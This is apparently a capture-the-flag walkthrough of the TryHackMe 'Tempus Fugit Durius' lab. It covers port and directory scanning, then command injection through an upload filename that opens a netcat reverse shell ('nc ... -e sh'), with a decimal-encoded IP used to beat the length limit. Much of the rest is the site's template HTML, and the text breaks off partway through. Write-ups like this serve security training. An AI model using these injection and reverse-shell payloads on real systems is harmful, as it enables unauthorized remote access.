---
The latin word Durius means "harder"
---

![222](https://i.imgur.com/M4EePuT.jpg)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/ebb4583d56854ec8cd0637832f1ccc8f.png)

### Harder

 Start Machine

Tempus Fugit is a Latin phrase that roughly translated as “time flies”.

Durius is also latin and means "harder".

This is a remake of Tempus Fugit 1. A bit harder and different from the first one.

It is an intermediate/hard, real life box.

Answer the questions below

```python
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ rustscan -a 10.10.238.9 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.238.9:22
Open 10.10.238.9:80
Open 10.10.238.9:111
Open 10.10.238.9:51424
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 11:56 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:56
Completed Parallel DNS resolution of 1 host. at 11:56, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:56
Scanning 10.10.238.9 [4 ports]
Discovered open port 22/tcp on 10.10.238.9
Discovered open port 80/tcp on 10.10.238.9
Discovered open port 51424/tcp on 10.10.238.9
Discovered open port 111/tcp on 10.10.238.9
Completed Connect Scan at 11:56, 0.37s elapsed (4 total ports)
Initiating Service scan at 11:56
Scanning 4 services on 10.10.238.9
Completed Service scan at 11:56, 14.15s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.238.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 9.20s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 1.21s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
Nmap scan report for 10.10.238.9
Host is up, received user-set (0.36s latency).
Scanned at 2023-01-26 11:56:03 EST for 25s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b1aca992d32a699168b46aac4543fbed (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPWmD4IaPbJQU46GEKX8pUal0IbZzIykktEuUh5boCKMuwsetNGanzNZYFd6eGWRd+zqr6nRnRFQPDiDZtt6DDz7NcJcXliGifQehWEEmskzfhdGSuh+kBUQaqXskCKZi0U/l9P0kvP6bD2SdsXqiYTBGQxN6a4Do1fyE2OoVYgPAAAAFQD4r+hmmsHGFfn0SV1mjGpoHpFwuwAAAIAnnoGwYiWDRAwFoPLkLYWahNwCbLAhVXOb1cnr8NxZN+uRMqEdtoZHNUbTd7ki8j5WpkZhMjFEyZQJg+MNQjUSxISlE1SoBTI8BmAUDAEvgPNyr0CDCS42rAY98JTMhaoZ8FOzgoatLmJWWgWqM+8YHCN4XHoVgm1vMagLsWxW5AAAAIBGW3tnTGis3+eWROnisRfyoo3zawOnd7oijjK7CAiIuxfqc3ESTzeLlkL0QBAIv/1PBGoZSTwg53aZqctO2/BgSNGMWDts3xnqpsEGNyo520Br/cBUyi6rRBotV1kL9tIT4VwdP33F/bjiHHRclfCmOtVYWmkst+HUSqS2yPn1WQ==
|   2048 3a3f9f5929c820d73ac504aa8236683f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0zYWd7C1JANU5TctI7lB/tyS9Aid6x5Dh2PnD7fpz6C9Apv9Y/YJzaCUYgqME41ZDxIIiegV02OSCkKFmXvr9gVVKaFHyUVhQ9Zb3FyQeGgWEL3004HIL+G06afXPlsRzNBb5VoqUte+5bigJT5UkyncAfWn+8bWLnFmuXDi5PZ4Pz0RHx9HzCwJ5G26DogQUI6M0zQkhJHzD+nWdIExvoY1L9UN4oZzCuaUF3Tcel3dDnbgi1RaZlfFi3r5NNUtQ7OVijWnms7nYNN7b77CZZWMhE6yMYI8+3ya99CfzA/oYsHv+t8XSbRyAdm5KvETrD8yoBrE14F2FekQQNggx
|   256 f92fbbe3ab95ee9e787c91187d9584ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAOH4ypeTzhthRbvcrzqVbbWXG1imFdejEQIo53fimAkjsOcrmEDWwT7Lskm5qyz4dmhGmfsH90xzOgQ+Bm6Nuk=
|   256 490e6fcbec6ca59767cc3c31ad94a454 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7iJO0KhscqLrJgy+mvB3Y+5U+WpOiBAxCr4TKu7pJB
80/tcp    open  http    syn-ack nginx 1.6.2
|_http-title: Tempus Fugit Durius
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.6.2
|_http-favicon: Unknown favicon MD5: 135A4C7175BDC2F57863FFE217BDBC31
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38080/tcp6  status
|   100024  1          41830/udp   status
|   100024  1          51424/tcp   status
|_  100024  1          54727/udp6  status
51424/tcp open  status  syn-ack 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.46 seconds

┌──(kali㉿kali)-[~/Downloads/gau]
└─$ gobuster dir -u http://10.10.238.9/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.238.9/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt,php,py,html
[+] Timeout:                 10s
===============================================================
2023/01/26 12:20:11 Starting gobuster in directory enumeration mode
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.238.9/2ae01b2f-77cf-498e-b54b-84dcf27899bc => 200 (Length: 774). To continue please exclude the status code or the length

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ feroxbuster -t 120 -u http://10.10.238.9 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.238.9
 🚀  Threads               │ 120
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET        7l       81w      483c Got 200 for http://10.10.238.9/c80a238a03ba47b59a03c2ded31653ca (url length: 32)
WLD      GET        4l       36w      209c Got 200 for http://10.10.238.9/55e4b434160b41629cbeeee291ad8a18b4d54a5fa5174539983fd6235d8dcdd4383184fe6bff4e138aff0ce9ccd7f2db (url length: 96)
200      GET        3l       27w      189c http://10.10.238.9/crack
200      GET        4l       43w      247c http://10.10.238.9/index
200      GET        3l       28w      178c http://10.10.238.9/images
200      GET        2l       29w      175c http://10.10.238.9/links
200      GET        3l       30w      194c http://10.10.238.9/news

http://10.10.238.9/c80a238a03ba47b59a03c2ded31653ca

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
Life would be so much easier if we could just look at the source code. 

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
Antonym, n.: The opposite of the word you're trying to think of. 

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
The best defense against logic is ignorance. 

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
Earth is a beta site. 

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
Don't let your mind wander -- it's too little to be let out alone. 

If God had intended Man to Walk, He would have given him Feet. 

we will invent new lullabies, new songs, new acts of love, we will cry over things we used to laugh & our new wisdom will bring tears to eyes of gentile creatures from other planets who were afraid of us till then & in the end a summer with wild winds & new friends will be. 

If you're happy, you're successful. 

If only one could get that wonderful feeling of accomplishment without having to accomplish anything. 

and more quotes


http://10.10.238.9/upload

Allowed file types are txt and rtf

uploading test.txt

    hi
    File successfully uploaded


using burp

Content-Disposition: form-data; name="file"; filename="test.txt;id"

Do intercept to this request


    uid=1000(www) gid=1000(www) groups=1000(www)
    File successfully uploaded

revshell

nc 10.8.19.103 443 -e sh

This command uses the "nc" (netcat) command to establish a connection to a remote server on port 443 using TCP. The "-e" flag specifies a command to be executed on the remote system once a connection is established. In this case, the command is "sh", which runs the default shell on the remote system. This command can potentially be used for malicious purposes, such as gaining unauthorized access to a remote system. It is important to use caution when running commands like this and to only use them on systems that you have permission to access.

Content-Disposition: form-data; name="file"; filename="test.txt;nc 10.8.19.103 443 -e sh"

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

That filename was way too long!

ip to decimal
https://www.ipaddressguide.com/ip

IP address 10.8.19.103 is equal to **168301415**.

Content-Disposition: form-data; name="file"; filename="a.txt;nc 168301415 443 -e sh"

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ mv test.txt a.txt
                                                                                                               
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ls
a.txt  test2.txt
                                                                                                               
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cat a.txt                

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.238.9.
Ncat: Connection from 10.10.238.9:58289.
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
bash-4.4$ whoami
whoami
www
bash-4.4$ ls
ls
__pycache__      main.py          supervisord.pid  uwsgi.ini
debug            prestart.sh      templates
index.html       static           upload

or another way

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ mv a.txt "a.txt;nc 168301415 443 -e sh"

upload it

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.238.9.
Ncat: Connection from 10.10.238.9:35704.
whoami
www
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied

bash-4.4$ cat index.html
cat index.html
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>Tempus Fugit Durius</title>

  <!-- Custom fonts for this theme -->
  <link href="static/css/000058all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">

  <!-- Theme CSS -->
  <link href="static/css/000010freelancer.min.css" rel="stylesheet">

</head>

<body id="page-top">

  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
    <div class="container">
      <a class="navbar-brand js-scroll-trigger" href="#page-top">Tempus Fugit Durius</a>
      <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
        Menu
        <i class="fas fa-bars"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#portfolio">Stuff</a>
          </li>
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#about">About</a>
          </li>
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#contact">Contact</a>
          </li>
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/upload">Upload</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>

  <!-- Masthead -->
  <header class="masthead bg-primary text-white text-center">
    <div class="container d-flex align-items-center flex-column">

      <!-- Masthead Avatar Image -->
      <img class="masthead-avatar mb-5" src="static/img/evil.png" alt="">

      <!-- Masthead Heading -->
      <h1 class="masthead-heading text-uppercase mb-0">Tempus Fugit Durius</h1>

      <!-- Icon Divider -->
      <div class="divider-custom divider-light">
        <div class="divider-custom-line"></div>
        <div class="divider-custom-icon">
          <i class="fas fa-star"></i>
        </div>
        <div class="divider-custom-line"></div>
      </div>

      <!-- Masthead Subheading -->
      <p class="masthead-subheading font-weight-light mb-0">By 4ndr34z</p>

    </div>
  </header>

  <!-- Portfolio Section -->
  <section class="page-section portfolio" id="portfolio">
    <div class="container">

      <!-- Portfolio Section Heading -->
      <h2 class="page-section-heading text-center text-uppercase text-secondary 
mb-0">Stuff</h2>

      <!-- Icon Divider -->
      <div class="divider-custom">
        <div class="divider-custom-line"></div>
        <div class="divider-custom-icon">
          <i class="fas fa-star"></i>
        </div>
        <div class="divider-custom-line"></div>
      </div>

      <!-- Portfolio Grid Items -->
      <div class="row">

        <!-- Portfolio Item 1 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal1">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000034cabin.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 2 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal2">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000029cake.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 3 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal3">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000032circus.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 4 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal4">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000030game.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 5 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal5">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000031safe.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 6 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal6">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000033submarine.png" alt="">
          </div>
        </div>

      </div>
      <!-- /.row -->

    </div>
  </section>

  <!-- About Section -->
  <section class="page-section bg-primary text-white mb-0" id="about">
    <div class="container">

      <!-- About Section Heading -->
      <h2 class="page-section-heading text-center text-uppercase text-white">About</h2>

      <!-- Icon Divider -->
      <div class="divider-custom divider-light">
        <div class="divider-custom-line"></div>
        <div class="divider-custom-icon">
          <i class="fas fa-star"></i>
        </div>
        <div class="divider-custom-line"></div>
      </div>

      <!-- About Section Content -->
      <div class="row">
        <div class="col-lg-4 ml-auto">
          <p class="lead">Tempus Fugit is a Latin phrase, usually 
translated into English as "time flies". When writing 
scripts, that is usually very true...
This site is for you to upload your scripts for safekeeping on our internal FTP-server. </p>
        </div>
        <div class="col-lg-4 mr-auto">
          <p class="lead"></p>
        </div>
      </div>

      <!-- About Section Button -->
      <div class="text-center mt-4">
      </div>

    </div>
  </section>

  <!-- Contact Section -->
  <section class="page-section" id="contact">
    <div class="container">

      <!-- Contact Section Heading -->
      <h2 class="page-section-heading text-center text-uppercase text-secondary mb-0">Contact Us</h2>

      <!-- Icon Divider -->
      <div class="divider-custom">
        <div class="divider-custom-line"></div>
        <div class="divider-custom-icon">
          <i class="fas fa-star"></i>
        </div>
        <div class="divider-custom-line"></div>
      </div>

      <!-- Contact Section Form -->
      <div class="row">
        <div class="col-lg-8 mx-auto">
          <!-- To configure the contact form email address, go to mail/contact_me.php and update the email address in the PHP file on line 19. -->
          <form name="sentMessage" id="contactForm" novalidate="novalidate">
            <div class="control-group">
              <div class="form-group floating-label-form-group controls mb-0 pb-2">
                <label>Name</label>
                <input class="form-control" id="name" type="text" placeholder="Name" required="required" data-validation-required-message="Please enter your name.">
                <p class="help-block text-danger"></p>
              </div>
            </div>
            <div class="control-group">
              <div class="form-group floating-label-form-group controls mb-0 pb-2">
                <label>Email Address</label>
                <input class="form-control" id="email" type="email" placeholder="Email Address" required="required" data-validation-required-message="Please enter your email address.">
                <p class="help-block text-danger"></p>
              </div>
            </div>
            <div class="control-group">
              <div class="form-group floating-label-form-group controls mb-0 pb-2">
                <label>Phone Number</label>
                <input class="form-control" id="phone" type="tel" placeholder="Phone Number" required="required" data-validation-required-message="Please enter your phone number.">
                <p class="help-block text-danger"></p>
              </div>
            </div>
            <div class="control-group">
              <div class="form-group floating-label-form-group controls mb-0 pb-2">
                <label>Message</label>
                <textarea class="form-control" id="message" rows="5" placeholder="Message" required="required" data-validation-required-message="Please enter a message."></textarea>
                <p class="help-block text-danger"></p>
              </div>
            </div>
            <br>
            <div id="success"></div>
            <div class="form-group">
              <button type="submit" class="btn btn-primary btn-xl" id="sendMessageButton">Send</button>
            </div>
          </form>
        </div>
      </div>

    </div>
  </section>

  <!-- Footer -->
  <footer class="footer text-center">
    <div class="container">
      <div class="row">

        <!-- Footer Location -->
        <div class="col-lg-4 mb-5 mb-lg-0">
          <h4 class="text-uppercase mb-4">Location</h4>
          <p class="lead mb-0">2215 John Daniel Drive
            <br>Clark, MO 65243</p>
        </div>

        <!-- Footer Social Icons -->
        <div class="col-lg-4 mb-5 mb-lg-0">
          <h4 class="text-uppercase mb-4">Around the Web</h4>
          <a class="btn btn-outline-light btn-social mx-1" href="#">
            <i class="fab fa-fw fa-facebook-f"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="#">
            <i class="fab fa-fw fa-twitter"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="#">
            <i class="fab fa-fw fa-linkedin-in"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="#">
            <i class="fab fa-fw fa-dribbble"></i>
          </a>
        </div>

        <!-- Footer About Text -->
        <div class="col-lg-4">
          <h4 class="text-uppercase mb-4">About Freelancer</h4>
          <p class="lead mb-0">Freelance is a free to use, MIT licensed Bootstrap theme created by
            <a href="http://startbootstrap.com">Start Bootstrap</a>.</p>
        </div>

      </div>
    </div>
  </footer>

  <!-- Copyright Section -->
  <section class="copyright py-4 text-center text-white">
    <div class="container">
      <small>Copyright &copy; Your Website 2019</small>
    </div>
  </section>

  <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes) -->
  <div class="scroll-to-top d-lg-none position-fixed ">
    <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>

  <!-- Portfolio Modals -->

  <!-- Portfolio Modal 1 -->
  <div class="portfolio-modal modal fade" id="portfolioModal1" tabindex="-1" role="dialog" aria-labelledby="portfolioModal1Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Log Cabin</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000034cabin.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 2 -->
  <div class="portfolio-modal modal fade" id="portfolioModal2" tabindex="-1" role="dialog" aria-labelledby="portfolioModal2Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Tasty Cake</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000029cake.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 3 -->
  <div class="portfolio-modal modal fade" id="portfolioModal3" tabindex="-1" role="dialog" aria-labelledby="portfolioModal3Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Circus Tent</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000032circus.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 4 -->
  <div class="portfolio-modal modal fade" id="portfolioModal4" tabindex="-1" role="dialog" aria-labelledby="portfolioModal4Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Controller</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000030game.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 5 -->
  <div class="portfolio-modal modal fade" id="portfolioModal5" tabindex="-1" role="dialog" aria-labelledby="portfolioModal5Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Locked Safe</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000031safe.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
